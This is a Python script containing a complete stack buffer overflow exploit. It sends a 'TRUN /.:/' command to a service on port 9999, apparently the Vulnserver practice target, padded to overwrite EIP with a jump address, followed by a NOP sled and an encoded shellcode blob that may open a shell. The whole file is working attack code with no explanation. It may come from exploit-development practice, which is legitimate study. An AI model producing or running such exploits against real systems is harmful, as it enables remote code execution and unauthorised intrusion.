import socket
import struct

s = socket.socket()
s.connect ( ("192.168.1.100", 9999) )

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0X62501203)

nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xbb\xa8\xc7\x6c\xb1\xda\xc5\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x59\x31\x5a\x14\x03\x5a\x14\x83\xea\xfc\x4a"
buf += b"\x32\x90\x59\x05\xbd\x69\x9a\x79\x37\x8c\xab\xab\x23"
buf += b"\xc4\x9e\x7b\x27\x88\x12\xf0\x65\x39\x24\xb1\xc0\x67"
buf += b"\xb1\xcf\xfc\x56\x3a\x1e\x3d\x34\xf8\x01\xc1\x47\x2d"
buf += b"\xe1\xf8\x87\x20\xe0\x3d\x5e\x4e\x0d\x93\x36\x3b\x83"
buf += b"\x04\x32\x79\x1f\x24\x94\xf5\x1f\x5e\x91\xca\xeb\xd2"
buf += b"\x98\x1a\x98\xb3\xba\x9b\x4d\xc8\xf3\x83\x21\x4a\xca"
buf += b"\xc0\xfd\x1d\xfc\xd7\x76\xa9\x75\x26\x5e\xe3\x49\x85"
buf += b"\x9f\xcb\x47\xd7\xd8\xec\xb7\xa2\x12\x0f\x45\xb5\xe1"
buf += b"\x6d\x91\x30\xf5\xd6\x52\xe2\xd1\xe7\xb7\x75\x92\xe4"
buf += b"\x7c\xf1\xfc\xe8\x83\xd6\x77\x14\x0f\xd9\x57\x9c\x4b"
buf += b"\xfe\x73\xc4\x08\x9f\x22\xa0\xff\xa0\x34\x0c\x5f\x05"
buf += b"\x3f\xbf\xb6\x39\xc0\x3f\xb7\x67\x56\xf3\x7a\x98\xa6"
buf += b"\x9b\x0d\xeb\x94\x04\xa6\x63\x94\xcd\x60\x73\xad\xda"
buf += b"\x92\xab\x15\x8a\x6c\x4c\x65\x82\xaa\x18\x35\xbc\x1b"
buf += b"\x21\xde\x3c\xa3\xf4\x4a\x37\x33\x5b\x90\xa4\x3b\xcb"
buf += b"\xa6\x2a\xad\x50\x2f\xcc\x9d\x38\x7f\x41\x5e\xe9\x3f"
buf += b"\x31\x36\xe3\xb0\x6e\x26\x0c\x1b\x07\xcd\xe3\xf5\x7f"
buf += b"\x7a\x9d\x5c\x0b\x1b\x62\x4b\x71\x1b\xe8\x79\x85\xd2"
buf += b"\x19\x08\x95\x03\x7e\xf2\x65\xd4\xeb\xf2\x0f\xd0\xbd"
buf += b"\xa5\xa7\xda\x98\x81\x67\x24\xcf\x92\x60\xda\x8e\xa2"
buf += b"\x1b\xed\x04\x8a\x73\x12\xc9\x0a\x84\x44\x83\x0a\xec"
buf += b"\x30\xf7\x59\x09\x3f\x22\xce\x82\xaa\xcd\xa6\x77\x7c"
buf += b"\xa6\x44\xa1\x4a\x69\xb7\x84\xc8\x6e\x47\x5a\xe7\xd6"
buf += b"\x2f\xa4\xb7\xe6\xaf\xce\x37\xb7\xc7\x05\x17\x38\x27"
buf += b"\xe5\xb2\x11\x2f\x6c\x53\xd3\xce\x71\x7e\xb5\x4e\x71"
buf += b"\x8d\x6e\x61\x08\xfe\x91\x82\xed\x16\xf6\x83\xed\x16"
buf += b"\x08\xb8\x3b\x2f\x7e\xff\xff\x14\x71\x4a\x5d\x3c\x18"
buf += b"\xb4\xf1\x3e\x09"

shellcode = buf

payload = [
	b"TRUN /.:/",
	#b"A" * total_length
	b"A" * offset,
	new_eip,
	nop_sled,
	shellcode,
	b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
]

payload = b"".join(payload)

s.send(payload)

s.close()
